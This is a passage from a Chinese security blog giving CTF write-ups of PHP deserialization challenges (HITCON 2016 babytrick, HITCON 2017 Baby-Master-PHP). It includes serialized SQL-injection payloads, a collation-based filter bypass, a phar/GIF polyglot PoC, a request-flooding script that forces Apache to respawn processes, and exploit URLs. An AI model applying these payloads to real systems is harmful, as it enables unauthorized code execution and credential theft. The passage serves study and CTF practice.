<p>&#x9996;&#x5148; <code>show</code> &#x65B9;&#x6CD5;&#x4E2D;&#x52A8;&#x6001;&#x62FC;&#x63A5;sql&#x8BED;&#x53E5;&#x91C7;&#x53D6;&#x4E86; <code>sprintf</code> &#x51FD;&#x6570;&#x3002;&#x4F46;&#x5176;&#x5BF9;&#x5355;&#x5F15;&#x53F7;&#x7B49;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x5E76;&#x6CA1;&#x6709;&#x8F6C;&#x4E49;&#x529F;&#x80FD;&#xFF0C;&#x53C8;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x5229;&#x7528;CVE-2016-7124 &#x6765;&#x7ED5;&#x8FC7;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x3002;&#x56E0;&#x6B64;&#x6B64;&#x5904;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#x3002;</p>
<p>&#x901A;&#x8FC7;sql&#x6CE8;&#x5165;&#x83B7;&#x5F97;orange&#x5BC6;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method=<span class="hljs-string">&quot;show&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&apos; union select password,1,1 from users where username = &apos;orange&apos;#&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn=<span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line">$payload1 = <span class="hljs-keyword">new</span> HITCON();</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($payload1));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x901A;&#x8FC7;&#x4E0A;&#x8FF0;&#x6B65;&#x9AA4;&#x5F97;&#x77E5; <code>orange</code> &#x7684;&#x5BC6;&#x7801;&#x662F; <code>babytrick1234</code></p>
<p>&#x63A5;&#x7740;&#x8FDB;&#x5165; <code>login</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x540D;&#x8DDF;&#x5BC6;&#x7801;&#x53EF;&#x4EE5;&#x5F97;&#x5230; flag&#x3002;&#x4F46;&#x5176;&#x65B9;&#x6CD5;&#x91CC;&#x4E00;&#x5904;&#x9650;&#x5236;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( $username == <span class="hljs-string">&apos;orange&apos;</span> || stripos($sql, <span class="hljs-string">&apos;orange&apos;</span>) != <span class="hljs-keyword">false</span> ) {</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Bypass&#x7684;&#x70B9;&#x4E3A; mysql&#x7684;&#x7F16;&#x7801;&#x8BBE;&#x7F6E;&#x5B89;&#x5168;</p>
<p>&#x732A;&#x732A;&#x4FA0;&#x5728;&#x5FAE;&#x535A;&#x4E0A;&#x66FE;&#x7ECF;&#x8BF4;&#x8FC7;</p>
<blockquote>
<p>MYSQL &#x4E2D; <code>utf8_unicode_ci</code>&#x548C;<code>utf8_general_ci</code>&#x4E24;&#x79CD;&#x7F16;&#x7801;&#x683C;&#x5F0F;,<code>utf8_general_ci</code>&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;,<code>&#xC4; = A, &#xD6; = O, &#xDC; = U</code>&#x8FD9;&#x4E09;&#x79CD;&#x6761;&#x4EF6;&#x90FD;&#x6210;&#x7ACB;,&#x5BF9;&#x4E8E;<code>utf8_general_ci</code>&#x4E0B;&#x9762;&#x7684;&#x7B49;&#x5F0F;&#x6210;&#x7ACB;&#xFF1A;&#xDF;=s,&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;<code>utf8_unicode_ci</code>&#x4E0B;&#x9762;&#x7B49;&#x5F0F;&#x624D;&#x6210;&#x7ACB;&#xFF1A;<code>&#xDF; = ss</code></p>
</blockquote>
<p>&#x672C;&#x5730;&#x4F7F;&#x7528; DVWA &#x7684;&#x5E93;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200311935.png" alt><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200319155.png" alt="image-20201113200319155"><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200327296.png" alt></p>
<p>&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x66FF;&#x6362;&#x5173;&#x952E;&#x5B57;&#x7B26;&#xFF0C;&#x6784;&#x9020;&#x6700;&#x7EC8;payload&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args;</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($method, $args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$args[<span class="hljs-string">&apos;username&apos;</span>] = <span class="hljs-string">&apos;OR&#xC4;NGE&apos;</span>;</span><br><span class="line">$args[<span class="hljs-string">&apos;password&apos;</span>] = <span class="hljs-string">&apos;babytrick1234&apos;</span>;</span><br><span class="line">$data = <span class="hljs-keyword">new</span> HITCON(<span class="hljs-string">&apos;login&apos;</span>,$args);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($data));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="HITCON-2017-Baby-Master-PHP"><a href="#HITCON-2017-Baby-Master-PHP" class="headerlink" title="HITCON 2017 Baby-Master-PHP"></a>HITCON 2017 Baby-Master-PHP</h3><p>&#x9898;&#x76EE;&#x91C7;&#x7528; i&#x6625;&#x79CB; &#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x3002;&#x5176;&#x5B9E;&#x672C;&#x6765;&#x6700;&#x5F00;&#x59CB;&#x590D;&#x73B0;&#x91C7;&#x7528;&#x7684;&#x662F;buu&#xFF0C;&#x4F46;&#x662F;buu&#x7684;&#x5E73;&#x53F0;&#x52A0;&#x8F7D;&#x4E0D;&#x4E86;&#x6211;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;phar&#x6587;&#x4EF6;&#x3002;&#x540E;&#x6765;&#x5C31;&#x6362;&#x4E86;</p>
<p>&#x9898;&#x76EE;&#x6E90;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&apos;die(`/read_flag`);&apos;</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&quot;session-data&quot;</span>])) {</span><br><span class="line">    $data = serialize(<span class="hljs-keyword">new</span> User($SANDBOX));</span><br><span class="line">    $hmac = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, $data, $SECRET);</span><br><span class="line">    setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, $data, $hmac));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $avatar;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        $random = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_$random() {&quot;</span></span><br><span class="line">            . <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">            . <span class="hljs-string">&quot;}&quot;</span>);</span><br><span class="line">        $_GET[<span class="hljs-string">&quot;lucky&quot;</span>]();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="hljs-string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="hljs-keyword">list</span>($data, $hmac) = explode(<span class="hljs-string">&quot;-----&quot;</span>, $data, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $data = unserialize($data);</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($data-&gt;avatar)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> $data-&gt;avatar;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">    $data = file_get_contents($_GET[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (substr($data, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    file_put_contents($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!file_exists($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) {</span><br><span class="line">        $path = <span class="hljs-string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">die</span>(file_get_contents($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="hljs-string">&quot;m&quot;</span>];</span><br><span class="line"><span class="hljs-keyword">if</span> ($mode == <span class="hljs-string">&quot;upload&quot;</span>) {</span><br><span class="line">    upload(check_session());</span><br><span class="line">} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($mode == <span class="hljs-string">&quot;show&quot;</span>) {</span><br><span class="line">    show(check_session());</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;IP:&quot;</span>.$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sandbox:&quot;</span>.<span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x6765;&#x7B2C;&#x4E00;&#x884C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x59FF;&#x52BF;&#x70B9;orz<br><code>$FLAG = create_function(&quot;&quot;, &apos;die(</code>/read_flag<code>);&apos;);</code>&#x3002;&#x6839;&#x636E;<a href="https://github.com/php/php-src/blob/d56a534acc52b0bb7d61ac7c3386ab96e8ca4a97/Zend/zend_builtin_functions.c#L1914" target="_blank" rel="noopener">php&#x6E90;&#x7801;</a></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200341989.png" alt="image-20201113200341989"></p>
<p>&#x533F;&#x540D;&#x51FD;&#x6570;&#x4F1A;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;<code>\x00lambda_%d</code> &#xFF0C;&#x5176;&#x4E2D; <code>%d</code> &#x4E3A;&#x6570;&#x5B57;&#xFF0C;&#x53D6;&#x51B3;&#x4E8E;&#x8FDB;&#x7A0B;&#x4E2D;&#x533F;&#x540D;&#x51FD;&#x6570;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6BCF;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x9898;&#x76EE;&#xFF0C;&#x5C31;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x533F;&#x540D;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x6837;&#x533F;&#x540D;&#x51FD;&#x6570;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4E0D;&#x53EF;&#x63A7;&#x3002;<br>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x53C2;&#x8003;: <a href="https://cloud.tencent.com/developer/article/1392036" target="_blank" rel="noopener">Apache &#x5DE5;&#x4F5C;&#x7684;&#x4E09;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;Prefork&#x3001;Worker&#x3001;Event</a><br>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5927;&#x91CF;&#x7684;&#x8BF7;&#x6C42;&#x6765;&#x8FEB;&#x4F7F;Pre-fork&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#x7684;Apache&#x542F;&#x52A8;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x91CC;&#x7684;<code>%d</code>&#x4F1A;&#x5237;&#x65B0;&#x4E3A;1&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x9884;&#x6D4B;&#x4E86;&#x3002;</p>
<blockquote>
<p>Apache-prefork&#x6A21;&#x578B;(&#x9ED8;&#x8BA4;&#x6A21;&#x578B;)&#x5728;&#x63A5;&#x53D7;&#x8BF7;&#x6C42;&#x540E;&#x4F1A;&#x5982;&#x4F55;&#x5904;&#x7406;,&#x9996;&#x5148;Apache&#x4F1A;&#x9ED8;&#x8BA4;&#x751F;&#x6210;5&#x4E2A;child server&#x53BB;&#x7B49;&#x5F85;&#x7528;&#x6237;&#x8FDE;&#x63A5;, &#x9ED8;&#x8BA4;&#x6700;&#x9AD8;&#x53EF;&#x751F;&#x6210;256&#x4E2A;child server, &#x8FD9;&#x65F6;&#x5019;&#x5982;&#x679C;&#x7528;&#x6237;&#x5927;&#x91CF;&#x8BF7;&#x6C42;, Apache&#x5C31;&#x4F1A;&#x5728;&#x5904;&#x7406;&#x5B8C;MaxRequestsPerChild&#x4E2A;tcp&#x8FDE;&#x63A5;&#x540E;kill&#x6389;&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;,&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x3002;</p>
</blockquote>
<p>&#x968F;&#x540E;&#x4EE3;&#x7801;&#x521D;&#x59CB;&#x5316;&#x4E86;&#x7528;&#x6237;&#x6C99;&#x7BB1;&#x3002;</p>
<p>&#x9898;&#x76EE;&#x4E2D;&#x5E72;&#x6270;&#x6700;&#x5927;&#x7684;&#x662F;<code>check_session</code> &#x51FD;&#x6570;&#x3002;<code>check_session</code> &#x51FD;&#x6570;&#x4E2D;&#x5177;&#x6709;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F; <code>hash_equals</code> &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x4E86;&#x6570;&#x636E;&#x6821;&#x9A8C;&#xFF0C;&#x800C; <code>$SECRET</code> &#x7684;&#x503C;&#x4E0D;&#x53EF;&#x77E5;&#x3002;&#x56E0;&#x6B64;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x70B9;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684;payload</p>
<p>&#x7136;&#x540E;&#x4EE3;&#x7801;&#x6709;&#x4E24;&#x4E2A;&#x7C7B;User&#x3001;Admin&#x3002;&#x5176;&#x5206;&#x522B;&#x662F;&#x7236;&#x7C7B;&#x4E0E;&#x5B50;&#x7C7B;&#x3002;admin&#x7C7B;&#x4E2D;&#x5B58;&#x5728;&#x654F;&#x611F;&#x51FD;&#x6570;eval&#x3002;&#x7136;&#x540E;&#x662F;&#x4E00;&#x4E2A; <code>$_GET[&quot;lucky&quot;]();</code> &#x8FD9;&#x6837;&#x7684;&#x52A8;&#x6001;&#x8C03;&#x7528;&#x3002;</p>
<p>&#x540E;&#x9762;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x4E24;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;<br>&#x4E14;&#x5BF9;&#x6587;&#x4EF6;&#x524D;&#x51E0;&#x4E2A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x4E86; <code>GIF89a</code> &#x7684;&#x9650;&#x5236;</p>
<p>&#x4E4B;&#x524D;&#x662F;0day&#xFF0C;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x90FD;&#x5206;&#x6790;&#x8FC7; phar &#x62D3;&#x5C55;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x539F;&#x7406;&#x3002;</p>
<p>upload&#x51FD;&#x6570;&#x4E2D; <code>file_get_contents</code> &#x8FD9;&#x7C7B;&#x6587;&#x4EF6;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#x4F1A;&#x89E6;&#x53D1; phar&#xFF0C;&#x4ECE;&#x800C;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
<p>poc.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> </span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> $avatar = <span class="hljs-string">&apos;orz&apos;</span>;  </span><br><span class="line">} </span><br><span class="line">$p = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.phar&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">$p[<span class="hljs-string">&apos;file.php&apos;</span>] = <span class="hljs-string">&apos;&lt;?php ?&gt;&apos;</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="hljs-string">&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;</span>);</span><br><span class="line">rename(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.phar&apos;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.gif&apos;</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x63A5;&#x7740;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5927;&#x91CF;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F; apache &#x91CD;&#x65B0;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;</p>
<p>&#x8D34;&#x4E0A; @orange &#x5E08;&#x5085;&#x7684;&#x811A;&#x672C; </p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="hljs-keyword">except</span>:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(i)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">        HOST = <span class="hljs-string">&apos;x.x.x.x&apos;</span></span><br><span class="line">        PORT = xx</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="hljs-string">&apos;GET /avatar.gif HTTP/1.1\nHost: yourip\nConnection: Keep-Alive\n\n&apos;</span>)</span><br><span class="line">        <span class="hljs-comment"># s.close()</span></span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;ok&apos;</span></span><br><span class="line">        time.sleep(<span class="hljs-number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="hljs-number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="hljs-number">0xffff</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;phar&#x6587;&#x4EF6;<br><a href="http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos;" target="_blank" rel="noopener">http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos;</a></p>
<p>&#x5229;&#x7528;&#x811A;&#x672C;&#x53D1;&#x51FA;&#x5927;&#x91CF;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F; apache &#x91CD;&#x65B0;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;</p>
<p>&#x6700;&#x540E;&#x8BBF;&#x95EE;<br><a href="http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1" target="_blank" rel="noopener">http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1</a></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200356402.png" alt></p>
<blockquote>
<p>refer<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1</a><br><a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/</a><br><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a><br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
</blockquote>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 Java 原生反序列化 &amp; JDK7u21 利用链分析</title>
    <url>/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x672C;&#x7BC7;&#x68B3;&#x7406;&#x4E86; Java &#x539F;&#x751F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;&#x540C;&#x65F6;&#x5206;&#x6790;&#x4E86; JDK 7u21&#x5229;&#x7528;&#x94FE;</p>
<a id="more"></a>

<h1 id="Serialization-and-Deserialization"><a href="#Serialization-and-Deserialization" class="headerlink" title="Serialization and Deserialization"></a>Serialization and Deserialization</h1><p>&#x53C2;&#x8003;&#x7F51;&#x4E0A;&#x6587;&#x7AE0;&#x68B3;&#x7406;&#x4E86;&#x4E00;&#x4E9B;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7EC6;&#x8282;</p>
<p><strong>Java &#x5E8F;&#x5217;&#x5316;&#x5C06;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6062;&#x590D;&#x6210;&#x5BF9;&#x8C61;</strong></p>
<p>&#x9996;&#x5148;&#x770B;&#x4E00;&#x4E0B;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x5230;&#x5E95;&#x6709;&#x4EC0;&#x4E48;&#x5185;&#x5BB9;&#x88AB;&#x5199;&#x5165;&#x4E86;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</p>
